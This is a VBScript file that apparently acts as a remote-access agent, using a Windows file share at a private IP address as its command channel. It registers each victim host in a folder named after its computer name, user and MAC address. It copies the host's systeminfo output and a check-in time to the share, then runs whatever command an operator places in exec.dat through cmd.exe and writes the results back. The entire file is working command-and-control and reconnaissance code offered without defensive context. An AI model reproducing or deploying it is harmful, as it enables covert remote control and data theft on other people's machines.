ServerName = "\\172.16.47.191"
ShareName = "D$"
ProjectName = "projectName"
Set NetworkObject = CreateObject("WScript.Network")
Set FSO = CreateObject("Scripting.FileSystemObject")

'NetworkObject.MapNetworkDrive "", ServerShare, False, UserName, Password'
ServerShare = ServerName & "\" & ShareName
projectDir = ServerShare & "\" & ProjectName

If NOT (FSO.FolderExists(projectDir)) Then
	FSO.CreateFolder(projectDir)
End If

'Get The First MAC address'
Set WMI = GetObject("winmgmts:\\.\root\cimv2")
Set Nads = WMI.ExecQuery("Select * from Win32_NetworkAdapter where physicaladapter=true")
Dim Nad
For Each Nad in Nads 
   macAddress = Nad.MACAddress
   exit for
Next

hostName = NetworkObject.ComputerName & "-" & NetworkObject.UserName & "-" & macAddress
hostName = Replace(hostName, ":", "-")
hostDir = projectDir & "\" & hostName
hostDir = Replace(hostDir, ":", "-")

If NOT (FSO.FolderExists(hostDir)) Then
	FSO.CreateFolder(hostDir)
End If
Set objShell = CreateObject("WScript.Shell") 

'Setting the %PATH% variable in the execution environment'
Set colVolEnvVars = objShell.Environment("Volatile")
colVolEnvVars("PATH") = hostDir

'File locations'
execFile = hostDir & "\exec.dat"
infoFile = hostDir & "\info.dat"
outFile = hostDir & "\output.dat"
pingFile = hostDir & "\ping.dat"
checkinFile = hostDir & "\checkin.dat"
pathFile = hostDir & "\path.dat"
Set colVolEnvVars = Nothing

'File that contains the UNC path for the Agent'
If not FSO.FileExists(pathFile) Then
	Set objFile = FSO.CreateTextFile(pathFile, 1)
	objFile.write(hostDir & "\")
	objFile.Close
End If

'File that is created when the agent first Checks-in'
If not FSO.FileExists(checkinFile) Then
	Set oExec = objShell.Exec("%comspec% /c date /t && time /t")
	Set objFile = FSO.CreateTextFile(checkinFile, 1)
	objFile.write(oExec.StdOut.ReadAll() & oExec.StdErr.ReadAll())
	objFile.Close
End If

'File that lists the hosts information'
If not FSO.FileExists(infoFile) Then
	Set oExec = objShell.Exec("%comspec% /c systeminfo")
	Set objFile = FSO.CreateTextFile(infoFile, 1)
	objFile.write(oExec.StdOut.ReadAll() & oExec.StdErr.ReadAll())
	objFile.Close
End If

'File that "changes" every time the script is run'
Set objFile = FSO.CreateTextFile(pingFile, 1)
objFile.write("")
objFile.Close

'File that contains a command'
If FSO.FileExists(execFile) Then

	Set execObjFile = FSO.OpenTextFile(execFile,1)
	user_comm = execObjFile.ReadAll()

	command = "%comspec% /c " & user_comm
	'command = "powershell.exe " & user_comm'
	Set oExec = objShell.Exec(command)

	Set objFile = FSO.OpenTextFile(outFile, 8, 1)
	objFile.write(oExec.StdOut.ReadAll() & oExec.StdErr.ReadAll())
	objFile.Close

	execObjFile.Close
	FSO.DeleteFile execFile 

End If
'NetworkObject.RemoveNetworkDrive ServerShare, True, False'
